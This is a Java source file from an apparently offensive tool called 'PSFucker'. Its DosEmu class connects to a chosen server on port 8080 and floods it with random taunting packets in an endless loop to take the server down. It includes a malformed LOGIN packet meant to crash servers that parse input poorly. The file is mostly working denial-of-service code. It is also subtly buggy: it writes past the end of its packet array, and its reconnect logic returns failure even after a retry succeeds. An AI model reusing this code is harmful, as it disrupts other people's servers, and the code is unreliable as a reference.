package com.manulaiko.psfucker.fuckers.global;

import com.manulaiko.psfucker.Option;
import com.manulaiko.psfucker.fuckers.Global;
import com.manulaiko.psfucker.net.global.ConnectionManager;
import com.manulaiko.psfucker.utils.Tools;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * DoS the emulator
 *
 * Denegation of Service that should work on all servers
 *
 * @author Manulaiko
 * @package com.manulaiko.fuckers.global
 */
public class DosEmu extends Option
{
    private Socket socket;
    private ConnectionManager connection;
    private boolean alreadyTried;

    /**
     * Constructor
     * @param global
     */
    public DosEmu(Global global)
    {
        super(global);
        super.description = "DoS the emulator";
    }

    /**
     * Executes the fucker
     */
    public void fuck()
    {
        if(!connect()) {
            return;
        }

        Thread dos = new Thread(){
            /**
             * Runs the DoS
             */
            public void run()
            {
                String[] packets = new String[10];
                packets[0] = "Fuck you!";
                packets[1] = "DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU";
                packets[2] = "What the fuck did you just said about me you little bitch? I dare you to know that I graduated top on my class of the Navy Seals and I have over 300 confirmed kills";
                packets[3] = ">inb4 PSFucker";
                packets[4] = "Ohio!";
                packets[5] = "Ayy lmao!";
                packets[6] = "It seems you're being fucked :)";
                packets[7] = "If you want this to stop just put your mobile up in the air and shout 'ACTIVATEEEEE!'";
                packets[8] = "LELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELEL";
                packets[9] = ">implying";
                packets[10] = "LOGIN|asdfasdfasdf|asdfasdf"; //If some servers can't parse packets properly a string instead of an integer might cause the server to explode :)
                while(true) {
                    int pAmount = Tools.r.nextInt(2000);
                    System.out.println("Sending "+pAmount+" packets to server...");
                    for(int i = 0; i < pAmount; i++) {
                        connection.send(packets[Tools.r.nextInt(10)]);
                        if(!connection.isConnected()) {
                            System.out.println("WE HAVE NEWS!!!");
                            System.out.println("Connection to the server is stopped, this means server might be dead or we're in the blacklist :)");
                            System.out.println("Press 'enter' to exit");
                            Tools.in.nextLine();
                            this.stop();
                        }
                    }
                    System.out.println(pAmount+" packets sent! Sleeping for 1sec");
                    System.out.println("Press 'enter' to stop");
                    try {
                        Thread.sleep(1000);
                    } catch(Exception e) { }
                }
            }
        };
        dos.start();

        System.out.println("Press 'enter' to exit");
        Tools.in.nextLine();
        dos.stop();
    }

    /**
     * Connects to the server
     */
    public boolean connect()
    {
        try {
            this.socket = new Socket();
            this.socket.connect(new InetSocketAddress(this.fucker.server, 8080));
            System.out.println("Connected to the server!");
            this.connection = new ConnectionManager(socket);
            return true;
        } catch(IOException e1) {
            if(alreadyTried) {
                System.out.print("Couldn't connect to the server: ");
                System.out.println(e1.getMessage());
                System.out.println("Exiting...");
                return false;
            } else {
                alreadyTried = true;
            }
            System.out.println("Couldn't connect to the server!");
            System.out.print("Re-enter server IP: ");
            String ip = Tools.in.nextLine();
            this.fucker.server = ip;
            connect();
        }

        return false;
    }
}
